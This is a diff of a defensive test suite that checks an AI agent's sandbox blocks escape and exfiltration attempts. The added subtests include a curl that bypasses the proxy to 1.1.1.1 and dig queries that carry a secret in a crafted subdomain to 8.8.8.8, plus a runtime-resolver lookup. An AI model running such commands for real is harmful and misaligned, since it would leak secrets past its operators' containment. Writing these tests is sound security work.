@@ -5,9 +5,11 @@ then runs five attacks from inside the agent container and
 asserts each one is blocked:
 
   1. Request to a non-allowlisted hostname
-  2. Request to a non-allowlisted IP (incl. host-header spoof)
+  2. Request to a non-allowlisted IP (incl. host-header spoof and a
+     direct connection that ignores the proxy)
   3. Secret exfil via HTTP — path / query / body / header
-  4. Secret exfil via crafted DNS subdomain + direct DNS query
+  4. Secret exfil via crafted DNS subdomain, a direct DNS query, and the
+     container runtime's resolver
   5. Secret exfil via README link pushed through git-gate
 
 The suite is backend-agnostic — it goes through `get_bottle_backend()`
@@ -23,6 +25,7 @@ subsequent chunks.
 from __future__ import annotations
 
 import os
+import re
 import shutil
 import tempfile
 import unittest
@@ -246,6 +249,20 @@ class TestSandboxEscape(unittest.TestCase):
                 f"stdout={r.stdout!r} stderr={r.stderr!r}",
             )
 
+        with self.subTest(attack="proxy bypass"):
+            # Ignore the proxy and dial a public address directly. The agent's
+            # network must have no route off the box, so this has to fail to
+            # connect; a completed request (any HTTP status) is a leak.
+            r = self._bottle.exec(  # type: ignore
+                "curl --noproxy '*' --silent --show-error --max-time 8 "
+                "--output /dev/null http://1.1.1.1/"
+            )
+            self.assertNotEqual(
+                0, r.returncode,
+                f"a direct connection bypassing the proxy succeeded; "
+                f"stdout={r.stdout!r} stderr={r.stderr!r}",
+            )
+
         with self.subTest(attack="host-header spoof"):
             r = self._bottle.exec(  # type: ignore
                 'curl --silent --show-error --max-time 8 --fail '
@@ -351,7 +368,7 @@ class TestSandboxEscape(unittest.TestCase):
     # ---- attack 4: DNS exfil -----------------------------------------
 
     def test_4_dns_exfil_blocked(self) -> None:
-        """Two sub-attacks against DNS:
+        """Three sub-attacks against DNS:
           4a — crafted subdomain attack. The hostname
               `<SECRET>.api.anthropic.com` looks "under" the
               allowlisted apex but egress's allowlist is
@@ -362,7 +379,9 @@ class TestSandboxEscape(unittest.TestCase):
               agent's internal network has no default gateway;
               even an explicit resolver like 8.8.8.8 should be
               unreachable. Confirms the network isolation is
-              intact (PRD 0022 Q2)."""
+              intact.
+          4c — the container runtime's resolver must not resolve a
+              public name, or DNS is a channel off the box."""
 
         with self.subTest(attack="crafted subdomain"):
             r = self._bottle.exec(  # type: ignore
@@ -376,28 +395,32 @@ class TestSandboxEscape(unittest.TestCase):
             )
 
         with self.subTest(attack="direct dig"):
-            # `+short +tries=1 +time=3`: no debug output, one attempt,
-            # 3s timeout. Outside the internal network has no path;
-            # dig should fail or return empty.
+            # Query a public resolver directly. Any reply at all — even
+            # NXDOMAIN — means the query (and the secret in its name) left
+            # the box, so the only acceptable outcome is no reply.
             r = self._bottle.exec(  # type: ignore
-                'dig +short +tries=1 +time=3 @8.8.8.8 '
-                '"$TEST_SECRET_DNS.example.com" '
-                '; echo "EXIT=$?"'
+                'dig +tries=1 +time=3 @8.8.8.8 '
+                '"$TEST_SECRET_DNS.example.com"'
             )
-            # `dig +short` prints the resolved A record(s). On
-            # success the secret would have escaped the bottle's
-            # internal network to reach 8.8.8.8 — that's a leak.
-            # Acceptable outcomes: timeout, refused, or no answer.
             self.assertNotIn(
-                "ANSWER SECTION", r.stdout,
-                f"dig got an ANSWER SECTION — the query escaped "
-                f"the internal network; stdout={r.stdout!r}",
+                "->>HEADER<<-", r.stdout,
+                f"8.8.8.8 answered, so the query escaped the agent's network; "
+                f"stdout={r.stdout!r}",
             )
-            # `dig +short` produces empty output on no-answer. We
-            # also assert no IP address appears (rough heuristic:
-            # a successful resolution would produce dotted-quad or
-            # IPv6 output).
-            self.assertNotIn(".0.0.", r.stdout)  # naive IP check
+            self.assertNotEqual(0, r.returncode, f"dig succeeded; stdout={r.stdout!r}")
+
+        with self.subTest(attack="runtime resolver"):
+            # The container runtime's own resolver (e.g. docker's 127.0.0.11)
+            # must not forward queries off the box either: a public name must
+            # not resolve without the gateway.
+            r = self._bottle.exec(  # type: ignore
+                "dig +short +tries=1 +time=3 example.com"
+            )
+            self.assertIsNone(
+                re.search(r"\b\d{1,3}(\.\d{1,3}){3}\b", r.stdout),
+                f"example.com resolved inside the agent, so DNS is a channel "
+                f"off the box; stdout={r.stdout!r}",
+            )
 
     # ---- attack 5: secret in README pushed via git-gate --------------
 
